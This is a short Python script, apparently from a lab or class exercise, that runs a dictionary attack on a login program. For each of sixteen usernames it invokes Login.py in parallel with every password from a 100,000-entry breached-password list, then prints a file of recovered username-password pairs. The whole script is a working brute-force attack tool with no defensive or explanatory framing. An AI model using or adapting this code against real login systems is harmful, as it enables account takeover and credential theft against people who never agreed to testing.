import time
import subprocess
import multiprocessing



def break_func(username, password_list):
    for password in password_list:
        arguments = ['python', 'Login.py', username, password]
        process = subprocess.run(arguments)



if __name__ == "__main__":
    password_list = []
    with open('PwnedPWs100k.txt', 'r', encoding='utf-8') as file:
        for line in file:
            stripped_line = line.strip()
            if stripped_line:
                password_list.append(stripped_line)
    usernames = [
    "ForestGreenWolf607",
    "SkyBlueBear611",
    "ForestPurpleFalcon522",
    "OceanPurpleShark246",
    "OceanGreenBear963",
    "MountainPurpleShark585",
    "StarRedWolf267",
    "SkySilverWolf337",
    "MountainYellowShark708",
    "StarGreenBear981",
    "SkySilverWolf162",
    "StarSilverBear427",
    "MountainBlueFalcon157",
    "ForestGreenShark821",
    "StarRedEagle761",
    "RiverOrangeTiger809"
]

    print('running...')
    time_start = time.time()
    with multiprocessing.Pool() as pool:
        pool.starmap(break_func, [(username, password_list) for username in usernames])
    time_end = time.time()
    total_time = time_end - time_start
    with open('username_password.txt', 'r') as file:
        for line in file:
            print(line)